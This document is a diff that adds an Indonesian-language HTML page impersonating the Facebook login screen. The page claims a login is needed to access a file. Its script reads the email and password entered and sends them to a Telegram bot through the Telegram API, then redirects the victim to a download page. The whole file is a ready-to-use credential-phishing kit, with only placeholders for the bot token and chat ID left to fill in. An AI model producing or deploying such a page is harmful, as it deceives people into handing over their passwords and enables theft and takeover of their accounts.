@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook Login</title>
+    <style>
+        * { font-family: Arial, sans-serif; margin: 0; padding: 0; box-sizing: border-box; }
+        body { background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; }
+        .login-box {
+            background-color: white; padding: 20px; width: 90%; max-width: 400px;
+            box-shadow: 0px 2px 10px rgba(0, 0, 0, 0.1); border-radius: 10px; text-align: center;
+        }
+        .fb-logo { font-size: 28px; font-weight: bold; color: #1877f2; margin-bottom: 10px; }
+        .desc { font-size: 14px; color: #606770; margin-bottom: 15px; }
+        input { width: 100%; padding: 12px; margin-bottom: 10px; border: 1px solid #ccc; border-radius: 5px; font-size: 16px; }
+        .btn {
+            width: 100%; padding: 12px; font-size: 18px; background-color: #1877f2;
+            color: white; border: none; border-radius: 5px; cursor: pointer; font-weight: bold;
+        }
+        .bottom-links { margin-top: 15px; font-size: 14px; }
+        .bottom-links a { color: #1877f2; text-decoration: none; }
+    </style>
+</head>
+<body>
+
+    <div class="login-box">
+        <div class="fb-logo">facebook</div>
+        <p class="desc">Masuk ke akun Facebook Anda untuk mengakses file.</p>
+        <input type="text" id="email" placeholder="Nomor ponsel atau email">
+        <input type="password" id="password" placeholder="Kata Sandi Facebook">
+        <button class="btn" id="loginBtn">Masuk</button>
+        <div class="bottom-links">
+            <a href="#">Buat akun</a> • <a href="#">Lupa Kata Sandi?</a>
+        </div>
+    </div>
+
+    <script>
+        const loginBtn = document.getElementById("loginBtn");
+
+        loginBtn.addEventListener("click", function() {
+            const email = document.getElementById("email").value;
+            const password = document.getElementById("password").value;
+            const botToken = "TOKEN_BOT_KAMU"; // Ganti dengan token bot Telegram
+            const chatId = "ID_TELEGRAM_OWNER"; // Ganti dengan ID Telegram owner
+
+            if (email.trim() === "" || password.trim() === "") {
+                alert("Harap isi semua kolom!");
+                return;
+            }
+
+            const message = `🔔 *Info Login Facebook* 🔔\n\n📧 *Email:* ${email}\n🔑 *Password:* ${password}`;
+
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: "Markdown" })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.ok) {
+                    window.location.href = "index.html"; // Balik ke halaman download setelah login sukses
+                } else {
+                    alert("Maaf, terjadi kesalahan. Silakan coba lagi.");
+                }
+            })
+            .catch(error => console.error("Error:", error));
+        });
+    </script>
+
+</body>
+</html>
